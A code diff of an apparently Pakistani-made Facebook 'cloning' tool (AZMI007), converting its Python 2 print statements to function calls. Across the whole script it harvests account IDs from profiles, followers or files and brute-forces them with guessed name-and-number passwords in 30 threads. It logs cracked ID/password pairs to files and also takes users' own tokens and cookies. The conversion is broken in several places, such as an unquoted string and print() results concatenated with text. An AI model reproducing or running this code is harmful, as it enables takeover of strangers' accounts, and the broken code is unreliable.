@@ -29,7 +29,7 @@ os.system('clear')
 reload(sys)
 sys.setdefaultencoding("utf8")
 
-#Dev:
+
 #### LOGO ####
 logo = """
 \033[0;34m     █████  ███████ ███    ███ ██
@@ -94,11 +94,11 @@ def reg2():
     print(logo)
     print("    \x1b[1;37mApproval not detected")
     print(" \x1b[1;92mCopy and press enter , then select WhatsApp to continue")
-    print ''
-    print ''
+    print(" ")
+    print(" ")
     id = uuid.uuid4().hex[:50]
     print(" Your id: ") + id
-    print("")
+    print(" ")
     raw_input(' Press enter to go to WhatsApp ')
     os.system('xdg-open https://wa.me/+923459690608')
     sav = open('/sdcard/.AZMI.txt', 'w')
@@ -142,7 +142,7 @@ def log_menu():
         menu()
     except (KeyError, IOError):
         os.system('clear')
-        print logo
+        print(logo)
         print("\x1b[1;93m ~~~~ Login menu ~~~~\x1b[1;91m")
         print(47 * '-')
         print("\x1b[1;92m[1] Login with FaceBook")
@@ -161,17 +161,17 @@ def log_menu_s():
     elif s == '3':
         log_cookie()
     else:
-        print ''
-        print '\\ Select valid option '
-        print ''
+        print(" ")
+        print("\\ Select valid option ")
+        print(" ")
         log_menu_s()
 
 
 def log_fb():
     os.system('clear')
-    print logo
-    print '\x1b[1;31;1mLogin with id/pass'
-    print 47 * '-'
+    print(logo)
+    print("\x1b[1;31;1mLogin with id/pass")
+    print(47 * '-')
     lid = raw_input('\x1b[1;92m Id/mail/no: ')
     pwds = raw_input(' \x1b[1;93mPassword: ')
     try:
@@ -183,26 +183,26 @@ def log_fb():
             ts.close()
             menu()
         elif 'www.facebook.com' in q['error']:
-            print ' User must verify account before login'
+            print(" User must verify account before login")
             raw_input('\x1b[1;92m Press enter to try again ')
             log_fb()
         else:
-            print ' Id/Pass may be wrong'
+            print(" Id/Pass may be wrong")
             raw_input(' \x1b[1;92mPress enter to try again ')
             log_fb()
     except:
-        print ''
-        print 'Exiting tool'
+        print(" ")
+        print(Exiting tool)
         os.system('exit')
 
 
 def log_token():
     os.system('clear')
-    print logo
-    print '\x1b[1;93mLogin with token\x1b[1;91m'
-    print 47 * '-'
+    print(logo)
+    print("\x1b[1;93mLogin with token\x1b[1;91m")
+    print(47 * '-')
     tok = raw_input(' \x1b[1;92mPaste token here: \x1b[1;91m')
-    print 47 * '-'
+    print(47 * '-')
     t_s = open('access_token.txt', 'w')
     t_s.write(tok)
     t_s.close()
@@ -211,10 +211,10 @@ def log_token():
 
 def log_cookie():
     os.system('clear')
-    print logo
-    print ''
-    print '\x1b[1;31;1mLogin Cookies'
-    print ''
+    print(logo)
+    print(" ")
+    print("\x1b[1;31;1mLogin Cookies")
+    print(" ")
     try:
         cookie = raw_input(' Paste cookies here: ')
         data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 
@@ -233,21 +233,21 @@ def log_cookie():
         ok.close()
         menu()
     except AttributeError:
-        print ''
-        print '\tInvalid cookies'
-        print ''
+        print(" ")
+        print("\tInvalid cookies")
+        print(" ")
         raw_input(' \x1b[1;92mPress enter to try again ')
         log_menu()
     except UnboundLocalError:
-        print ''
-        print '\tInvalid cookies'
-        print ''
+        print(" ")
+        print("\tInvalid cookies")
+        print(" ")
         raw_input(' \x1b[1;92mPress enter to try again ')
         log_menu()
     except requests.exceptions.SSLError:
-        print ''
-        print '\tInvalid cookies'
-        print ''
+        print(" ")
+        print("\tInvalid cookies")
+        print(" ")
         raw_input(' \x1b[1;92mPress enter to try again ')
         log_menu()
 
@@ -257,9 +257,9 @@ def menu():
     try:
         token = open('access_token.txt', 'r').read()
     except (KeyError, IOError):
-        print ''
-        print logo
-        print '\x1b[1;31;1mLogin FB id to continue'
+        print(" ")
+        print(logo)
+        print("\x1b[1;31;1mLogin FB id to continue")
         time.sleep(1)
         log_menu()
 
@@ -268,34 +268,34 @@ def menu():
         q = json.loads(r.text)
         z = q['name']
     except (KeyError, IOError):
-        print logo
-        print ''
-        print '\t Account Cheekpoint\x1b[0;97m'
-        print ''
+        print(logo)
+        print(" ")
+        print("\t Account Cheekpoint\x1b[0;97m")
+        print(" ")
         os.system('rm -rf access_token.txt')
         time.sleep(1)
         log_menu()
     except requests.exceptions.ConnectionError:
         print logo
-        print ''
-        print '\t Turn on mobile data/wifi\x1b[0;97m'
-        print ''
+        print(" ")
+        print("\t Turn on mobile data/wifi\x1b[0;97m")
+        print("")
         raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
         menu()
 
     os.system('clear')
-    print logo
+    print(logo)
     tok = open('/sdcard/.Azmi.txt', 'r').read()
-    print '  \x1b[1;92mLogged in user: \x1b[1;91m' + z
-    print 47 * '-'
-    print ' \x1b[1;93m Active token: \x1b[1;91m' + tok
-    print ' ------------------------------------------ '
-    print '\x1b[1;92m[1] Crack with Auto password 10'
-    print '\x1b[1;92m[2] Crack with Number password 6'
-    print '\x1b[1;92m[3] Crack with Name + Number password 8'
-    print '\x1b[1;92m[4] Extract File'
-    print '\x1b[1;92m[5] Logout'
-    print '\x1b[1;92m[6] Delete trash files'
+    print("  \x1b[1;92mLogged in user: \x1b[1;91m") + z
+    print(47 * '-')
+    print(" \x1b[1;93m Active token: \x1b[1;91m") + tok
+    print(" ------------------------------------------ ")
+    print("\x1b[1;92m[1] Auto password 10")
+    print("\x1b[1;92m[2] Number password 20")
+    print("\x1b[1;92m[3] Name + Number password 12")
+    print("\x1b[1;92m[4] Extract File")
+    print("\x1b[1;92m[5] Logout")
+    print("\x1b[1;92m[6] Delete trash files")
     menu_s()
 
 
@@ -314,9 +314,9 @@ def menu_s():
     elif ms == '6':
         rtrash()
     else:
-        print ''
-        print '\tSelect valid option'
-        print ''
+        print(" ")
+        print("\tSelect valid option")
+        print(" ")
         menu_s()
 
 
@@ -326,20 +326,20 @@ def crack():
         toket = open('login.txt', 'r').read()
     except (KeyError, IOError):
         os.system('clear')
-        print logo
-        print '\t File Not Found \x1b[0;97m'
-        print ''
+        print(logo)
+        print("\t File Not Found \x1b[0;97m")
+        print(" ")
         time.sleep(1)
         log_menu()
 
     os.system('clear')
-    print logo
-    print '\x1b[1;93m~~~~ Auto pass cracking ~~~~\x1b[1;91m'
-    print 47 * '-'
-    print '\x1b[1;92m[1] Public id cloning'
-    print '\x1b[1;92m[2] Followers cloning'
-    print '\x1b[1;92m[3] File cloning'
-    print '\x1b[1;92m[0] Back'
+    print(logo)
+    print("\x1b[1;93m~~~~ Auto pass cracking ~~~~\x1b[1;91m")
+    print(47 * '-')
+    print("\x1b[1;92m[1] Public id cloning")
+    print("\x1b[1;92m[2] Followers cloning")
+    print("\x1b[1;92m[3] File cloning")
+    print("\x1b[1;92m[0] Back")
     a_s()
 
 
@@ -349,20 +349,20 @@ def auto_crack():
         token = open('access_token.txt', 'r').read()
     except (KeyError, IOError):
         os.system('clear')
-        print logo
-        print '\t Login FB id to continue\x1b[0;97m'
-        print ''
+        print(logo)
+        print("\t Login FB id to continue\x1b[0;97m")
+        print(" ")
         time.sleep(1)
         log_menu()
 
     os.system('clear')
-    print logo
-    print '\x1b[1;93m~~~~ Auto pass cracking ~~~~\x1b[1;91m'
-    print 47 * '-'
-    print '\x1b[1;92m[1] Public id cloning'
-    print '\x1b[1;92m[2] Followers cloning'
-    print '\x1b[1;92m[3] File cloning'
-    print '\x1b[1;92m[0] Back'
+    print(logo)
+    print("\x1b[1;93m~~~~ Auto pass cracking ~~~~\x1b[1;91m")
+    print(47 * '-')
+    print("\x1b[1;92m[1] Public id cloning")
+    print("\x1b[1;92m[2] Followers cloning")
+    print("\x1b[1;92m[3] File cloning")
+    print("\x1b[1;92m[0] Back")
     a_s()
 
 
@@ -373,20 +373,20 @@ def a_s():
     a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80==>\xe2\x9e\xa4 ')
     if a_s == '1':
         os.system('clear')
-        print logo
-        print '\x1b[1;93m~~~~ Auto pass public cracking ~~~~\x1b[1;91m'
-        print 47 * '-'
+        print(logo)
+        print("\x1b[1;93m~~~~ Auto pass public cracking ~~~~\x1b[1;91m")
+        print(47 * '-')
         idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
             q = json.loads(r.text)
             z = q['name']
             os.system('clear')
-            print logo
-            print '\x1b[1;93m~~~~ Auto pass public cracking ~~~~'
-            print ' \x1b[1;92mCloning from: ' + z
+            print(logo)
+            print("\x1b[1;93m~~~~ Auto pass public cracking ~~~~")
+            print(" \x1b[1;92mCloning from: ") + z
         except (KeyError, IOError):
-            print '\t Invalid user \x1b[0;97m'
+            print("\t Invalid user \x1b[0;97m")
             raw_input(' \x1b[1;92mPress enter to try again ')
             auto_crack()
 
@@ -400,11 +400,11 @@ def a_s():
 
     elif a_s == '2':
         os.system('clear')
-        print logo
-        print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~\x1b[1;91m'
-        print 47 * '-'
-        print ' \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
-        print 47 * '-'
+        print(logo)
+        print("\x1b[1;93m~~~~ Name pass followers cracking ~~~~\x1b[1;91m")
+        print(47 * '-')
+        print(" \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m")
+        print(47 * '-')
         p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
         p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
         p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
@@ -415,11 +415,11 @@ def a_s():
             q = json.loads(r.text)
             z = q['name']
             os.system('clear')
-            print logo
-            print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~'
-            print ' \x1b[1;92mCloning from: ' + z
+            print(logo)
+            print("\x1b[1;93m~~~~ Name pass followers cracking ~~~~")
+            print(" \x1b[1;92mCloning from: ") + z
         except (KeyError, IOError):
-            print '\t Invalid user \x1b[0;97m'
+            print("\t Invalid user \x1b[0;97m")
             raw_input('\x1b[1;92mPress enter to try again ')
             auto_crack()
 
@@ -433,32 +433,32 @@ def a_s():
 
     elif a_s == '3':
         os.system('clear')
-        print logo
-        print '\x1b[1;93m~~~~ Auto pass File cracking ~~~~\x1b[1;91m'
-        print 47 * '-'
+        print(logo)
+        print("\x1b[1;93m~~~~ Auto pass File cracking ~~~~\x1b[1;91m")
+        print(47 * '-')
         try:
             idlist = raw_input('[+] File Name: ')
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
 
         except IOError:
-            print '[!] File Not Found.'
+            print("[!] File Not Found.")
             raw_input('Press Enter To Back. ')
             crack()
 
     elif a_s == '0':
         menu()
     else:
-        print ''
-        print '\tChoose valid option' + w
+        print(" ")
+        print("\tChoose valid option") + w
         a_s()
-    print ' Total ids: ' + str(len(id))
+    print(" Total ids: ") + str(len(id))
     time.sleep(0.5)
-    print ' \x1b[1;97mCrack Running\x1b[1;91m '
+    print(" \x1b[1;97mCrack Running\x1b[1;91m ")
     time.sleep(0.5)
-    print 47 * '-'
-    print '\t\x1b[1;92m{AZMI007}  {Cloning Tool}\x1b[1;91m'
-    print 47 * '-'
+    print(47 * '-')
+    print("\t\x1b[1;92m{AZMI007}  {Cloning Tool}\x1b[1;91m")
+    print(47 * '-')
 
     def main(arg):
         user = arg
@@ -468,13 +468,13 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass1
+                print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass1
                 cp = open('AZMI_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -484,13 +484,13 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass2
+                    print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass2
                     cp = open('AZMI_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -500,13 +500,13 @@ def a_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass3
+                        print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass3
                         cp = open('AZMI_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -516,13 +516,13 @@ def a_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass4
+                            print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass4
                             cp = open('AZMI_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -532,13 +532,13 @@ def a_s():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass5
+                                print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass5
                                 cp = open('AZMI_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
@@ -548,13 +548,13 @@ def a_s():
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                 q = json.loads(data)
                                 if 'loc' in q:
-                                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass6
+                                    print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass6
                                     cp = open('AZMI_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
@@ -564,13 +564,13 @@ def a_s():
                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                     q = json.loads(data)
                                     if 'loc' in q:
-                                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass7 + '\x1b[0;97m'
                                         ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                                         ok.write(uid + ' | ' + pass7 + '\n')
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in q['error']:
-                                        print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass7
+                                        print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass7
                                         cp = open('AZMI_CP.txt', 'a')
                                         cp.write(uid + ' | ' + pass7 + '\n')
                                         cp.close()
@@ -580,13 +580,13 @@ def a_s():
                                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                         q = json.loads(data)
                                         if 'loc' in q:
-                                            print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass8 + '\x1b[0;97m'
                                             ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                                             ok.write(uid + ' | ' + pass8 + '\n')
                                             ok.close()
                                             oks.append(uid + pass8)
                                         elif 'www.facebook.com' in q['error']:
-                                            print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass8
+                                            print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass8
                                             cp = open('AZMI_CP.txt', 'a')
                                             cp.write(uid + ' | ' + pass8 + '\n')
                                             cp.close()
@@ -596,13 +596,13 @@ def a_s():
                                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                             q = json.loads(data)
                                             if 'loc' in q:
-                                                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
+                                                print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                 ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                                                 ok.write(uid + ' | ' + pass9 + '\n')
                                                 ok.close()
                                                 oks.append(uid + pass9)
                                             elif 'www.facebook.com' in q['error']:
-                                                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass9
+                                                print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass9
                                                 cp = open('AZMI_CP.txt', 'a')
                                                 cp.write(uid + ' | ' + pass9 + '\n')
                                                 cp.close()
@@ -612,13 +612,13 @@ def a_s():
                                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                 q = json.loads(data)
                                                 if 'loc' in q:
-                                                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
+                                                    print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                     ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                                                     ok.write(uid + ' | ' + pass10 + '\n')
                                                     ok.close()
                                                     oks.append(uid + pass10)
                                                 elif 'www.facebook.com' in q['error']:
-                                                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass10
+                                                    print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass10
                                                     cp = open('AZMI_CP.txt', 'a')
                                                     cp.write(uid + ' | ' + pass10 + '\n')
                                                     cp.close()
@@ -628,10 +628,10 @@ def a_s():
 
     p = ThreadPool(30)
     p.map(main, id)
-    print 47 * '-'
-    print ' \x1b[1;92mCrack Done'
-    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
-    print 47 * '-'
+    print(47 * '-')
+    print(" \x1b[1;92mCrack Done")
+    print(" \x1b[1;92mTotal Ok/\x1b[1;31;1mCp:") + str(len(oks)) + '/' + str(len(cps))
+    print(47 * '-')
     raw_input(' \x1b[1;93mPress enter to back')
     auto_crack()
 
@@ -642,19 +642,19 @@ def crack_b():
         toket = open('login.txt', 'r').read()
     except (KeyError, IOError):
         os.system('clear')
-        print logo
-        print '\t File Not Found \x1b[0;97m'
+        print(logo)
+        print("\t File Not Found \x1b[0;97m")
         time.sleep(1)
         log_menu()
 
     os.system('clear')
-    print logo
-    print '\x1b[1;93m~~~~ Number pass cracking ~~~~\x1b[1;91m'
-    print 47 * '-'
-    print '\x1b[1;92m[1] Public id cloning'
-    print '\x1b[1;92m[2] Followers cloning'
-    print '\x1b[1;92m[3] File cloning'
-    print '\x1b[1;92m[0] Back'
+    print(logo)
+    print("\x1b[1;93m~~~~ Number pass cracking ~~~~\x1b[1;91m")
+    print(47 * '-')
+    print("\x1b[1;92m[1] Public id cloning")
+    print("\x1b[1;92m[2] Followers cloning")
+    print("\x1b[1;92m[3] File cloning")
+    print("\x1b[1;92m[0] Back")
     c_s()
 
 
@@ -664,19 +664,19 @@ def choice_crack():
         token = open('access_token.txt', 'r').read()
     except (KeyError, IOError):
         os.system('clear')
-        print logo
-        print '\x1b[1;93m~~~ Login FB id to continue ~~~'
+        print(logo)
+        print("\x1b[1;93m~~~ Login FB id to continue ~~~")
         time.sleep(1)
         log_menu()
 
     os.system('clear')
-    print logo
-    print '\x1b[1;93m~~~~ Number pass cracking ~~~~\x1b[1;91m'
-    print 47 * '-'
-    print '\x1b[1;92m[1] Public id cloning'
-    print '\x1b[1;92m[2] Followers cloning'
-    print '\x1b[1;92m[3] File cloning'
-    print '\x1b[1;92m[0] Back'
+    print(logo)
+    print("\x1b[1;93m~~~~ Number pass cracking ~~~~\x1b[1;91m")
+    print(47 * '-')
+    print("\x1b[1;92m[1] Public id cloning")
+    print("\x1b[1;92m[2] Followers cloning")
+    print("\x1b[1;92m[3] File cloning")
+    print("\x1b[1;92m[0] Back")
     c_s()
 
 
@@ -687,11 +687,11 @@ def c_s():
     a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\X80==>\xe2\x9e\xa4 ')
     if a_s == '1':
         os.system('clear')
-        print logo
-        print '\x1b[1;93m ~~~~ Number pass Public cracking ~~~~\x1b[1;91m'
-        print 47 * '-'
-        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
-        print 47 * '-'
+        print(logo)
+        print("\x1b[1;93m ~~~~ Number pass Public cracking ~~~~\x1b[1;91m")
+        print(47 * '-')
+        print("\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m")
+        print(47 * '-')
         pass1 = raw_input(' \x1b[1;92m[1]Password: ')
         pass2 = raw_input(' \x1b[1;92m[2]Password: ')
         pass3 = raw_input(' \x1b[1;92m[3]Password: ')
@@ -704,11 +704,11 @@ def c_s():
             q = json.loads(r.text)
             z = q['name']
             os.system('clear')
-            print logo
-            print '\x1b[1;93m ~~~~ Number pass Public cracking ~~~~'
-            print ' Cloning from: ' + z
+            print(logo)
+            print("\x1b[1;93m ~~~~ Number pass Public cracking ~~~~")
+            print(" Cloning from: ") + z
         except (KeyError, IOError):
-            print '\t Invalid user \x1b[0;97m'
+            print("\t Invalid user \x1b[0;97m")
             raw_input(' Press enter to try again ')
             choice_crack()
 
@@ -722,11 +722,11 @@ def c_s():
 
     elif a_s == '2':
         os.system('clear')
-        print logo
-        print '\x1b[1;93m~~~~ Number pass followers cracking ~~~~\x1b[1;91m'
-        print 47 * '-'
-        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
-        print 47 * '-'
+        print(logo)
+        print("\x1b[1;93m~~~~ Number pass followers cracking ~~~~\x1b[1;91m")
+        print(47 * '-')
+        print("\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m")
+        print(47 * '-')
         pass1 = raw_input(' \x1b[1;92m[1]Password: ')
         pass2 = raw_input(' \x1b[1;92m[2]Password: ')
         pass3 = raw_input(' \x1b[1;92m[3]Password: ')
@@ -737,11 +737,11 @@ def c_s():
             q = json.loads(r.text)
             z = q['name']
             os.system('clear')
-            print logo
-            print '\x1b[1;93m~~~~ Number pass followers cracking ~~~~'
-            print ' Cloning from: ' + z
+            print(logo)
+            print("\x1b[1;93m~~~~ Number pass followers cracking ~~~~")
+            print(" Cloning from: ") + z
         except (KeyError, IOError):
-            print '\t Invalid user \x1b[0;97m'
+            print("\t Invalid user \x1b[0;97m")
             raw_input('Press enter to try again ')
             auto_crack()
 
@@ -755,11 +755,11 @@ def c_s():
 
     elif a_s == '3':
         os.system('clear')
-        print logo
-        print '\x1b[1;93m ~~~~ Number pass File cracking ~~~~\x1b[1;91m'
-        print 47 * '-'
-        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
-        print 47 * '-'
+        print(logo)
+        print("\x1b[1;93m ~~~~ Number pass File cracking ~~~~\x1b[1;91m")
+        print(47 * '-')
+        print("\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m")
+        print(47 * '-')
         pass1 = raw_input(' \x1b[1;92m[1]Password: ')
         pass2 = raw_input(' \x1b[1;92m[2]Password: ')
         pass3 = raw_input(' \x1b[1;92m[3]Password: ')
@@ -772,23 +772,23 @@ def c_s():
                 id.append(line.strip())
 
         except IOError:
-            print '[!] File Not Found.'
+            print("[!] File Not Found.")
             raw_input('Press Enter To Back. ')
             crack_b()
 
     elif a_s == '0':
         menu()
     else:
-        print ''
-        print '\t Choose valid option' + w
+        print(" ")
+        print("\t Choose valid option") + w
         c_s()
-    print ' Total ids: ' + str(len(id))
+    print(" Total ids: ") + str(len(id))
     time.sleep(0.5)
-    print ' \x1b[1;97m~~~ Crack Running ~~~\x1b[1;91m'
+    print(" \x1b[1;97m~~~ Crack Running ~~~\x1b[1;91m")
     time.sleep(0.5)
-    print 47 * '-'
-    print '\t\x1b[1;94m{AZMI007}  {Cloning Tool\x1b[1;91m'
-    print 47 * '-'
+    print(47 * '-')
+    print("\t\x1b[1;94m{AZMI007}  {Cloning Tool\x1b[1;91m")
+    print(47 * '-')
 
     def main(arg):
         user = arg
@@ -797,13 +797,13 @@ def c_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass1
+                print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass1
                 cp = open('AZMI_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -812,13 +812,13 @@ def c_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass2
+                    print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass2
                     cp = open('AZMI_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -827,13 +827,13 @@ def c_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass3
+                        print("\x1b[1;31;1m[CP] ") + uid + ' | ' + pass3
                         cp = open('AZMI_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -842,13 +842,13 @@ def c_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print("\x1b[1;92m[OK] \x1b[1;32m") + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
